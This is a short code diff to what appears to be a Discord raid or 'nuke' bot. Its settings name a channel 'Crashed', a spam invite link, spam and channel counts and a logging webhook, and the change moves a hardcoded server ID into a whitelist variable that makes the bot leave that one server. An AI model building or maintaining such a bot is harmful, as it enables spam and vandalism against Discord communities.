@@ -16,6 +16,7 @@ ChannelName = "Crashed"
 SpamLink = "https://discord.gg/angelicplate"
 SpamAmount = 5
 ChannelsAmount = 20
+WhiteListServerID = 1000000000
 webhook_url = "Here Your Webhook URL Wheres will be Logs"
 
 class Colors:
@@ -50,7 +51,7 @@ async def on_guild_join(guild):
 	gu = guild.name
 	av = guild.icon
 			
-	if guild.id == 1297477436560379924:
+	if guild.id == WhiteListServerID:
 		await guild.leave()
 		return
 	
